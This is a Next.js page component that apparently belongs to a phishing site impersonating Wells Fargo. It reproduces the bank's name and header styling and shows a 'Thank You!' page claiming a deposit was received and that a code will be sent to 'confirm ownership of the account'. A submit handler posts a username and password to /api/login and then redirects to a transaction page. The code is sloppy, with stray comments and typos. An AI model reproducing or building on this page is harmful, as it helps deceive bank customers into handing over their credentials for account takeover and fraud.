"use client"
import axios from "axios";
import Image from "next/image";
import { Heroicon } from '../components/icons'; // Importing icons
// import {HandBurger} from "../components/icons"
import { useEffect, useState } from "react";
import Link from "next/link";
import { ClockIcon } from "@heroicons/react/16/solid";
import { LockClosedIcon } from "@heroicons/react/24/outline";

export default function Main() {

  const [isLoading, setIsLoading] = useState(false)
    const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');

const handleSubmit = async (event: { preventDefault: () => void; }) => {
  event.preventDefault();

  //Check if both username and password are not empty
  if (!username.trim() ||!password.trim()){
    return alert("Please fill in both username and password.");
  }
  if(!username && !password){
    return alert("login required")
  }
  setIsLoading(true);

  try {
    const response = await axios.post('/api/login', {
      username,
      password
    }, {
      headers: {
        'Content-Type': 'application/json'
      }
    });

    const data = response.data; // Use.data property to access the response body
    console.log(data);

    // if successful navigate to thank you page
    // window.location.href = '/thank-you';
      if (response.status >= 200 && response.status < 300) {
        // window.location.href = '/thank-you';
        window.location.href = '/transaction';

   }
    // 
    // Clear username and password fields
    setUsername('');
    setPassword('');
  } catch (error) {
    console.error(error);
    // Optionally, handle errors here
  } finally {
    setIsLoading(false);
  }
};
// const MyComponent = () => {
//   const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);

//   useEffect(() => {
//     const handleResize = () => {
//       setIsMobile(window.innerWidth <= 768);
//     };

//     window.addEventListener('resize', handleResize);

//     return () => {
//       window.removeEventListener('resize', handleResize);
//     };
//   }, []);

//   const backgroundColor = isMobile? 'black' : 'url("/assets/background.jpg")';
// https://heroicons.com/


  return (
    
    <main style={{

      backgroundImage: "url('/assets/background.jpg')",
      backgroundAttachment: 'fixed',
      backgroundSize: 'cover',
      backgroundRepeat: 'no-repeat',
      backgroundPosition: 'center center',
      height: '100%', // Example height, adjust as needed
              width: '100%', // Example width, adjust as needed
      zIndex:9999}}>
        
        <div className='flex justify-between items-center text-white py-2 px-[20%] bg-red-600 border border-b-2 border-b-yellow-300'//</main>style={{position: 'fixed', top: 0, left: 0, right: 0, zIndex: 9999}}..//>
      >
      <div className="flex flex-col font-bold text-[25px]">
          <span>WELLS FARGO</span>
        </div>
        <div className='space-x-4 space-y-10 text-xs'>
          <Link href="/" legacyBehavior><a className="hover:text-gray-500"> <LockClosedIcon className=" m-h-5 w-5 mr-2" /> {/* Heroicon Icon */}
          Customer Service</a></Link>
          <Link href="/about" legacyBehavior><a className="hover:text-gray-500">Atms/Locations</a></Link>
          <Link href="/contact" legacyBehavior><a className="hover:text-gray-500">Español</a></Link>
        </div>
</div>
<div className="flex flex-col justtify-center items-center w-full mx-uto">
  <span className="text-[70px] font-bold font-ui-serif py-32">Thank You!</span>
</div>
<div className="container w-full sm:w-[60%] md:w-[60%] lg:w-[30%] mx-auto px-6 bg-white mt-20">
      <div className="flex flex-col items-center justify-center space-y-4 py-3 rounded-md shadow-xl border border-gray-100">  
        <span className='text-center text-sm font-font-bold'>Your deposit submission has been received, <br /> a code would be sent to confirm ownership of the account, <br /> It may take 3 - 5 working days for your funds to arrive in your account. </span>
         </div>
          </div>
</main>
  );
}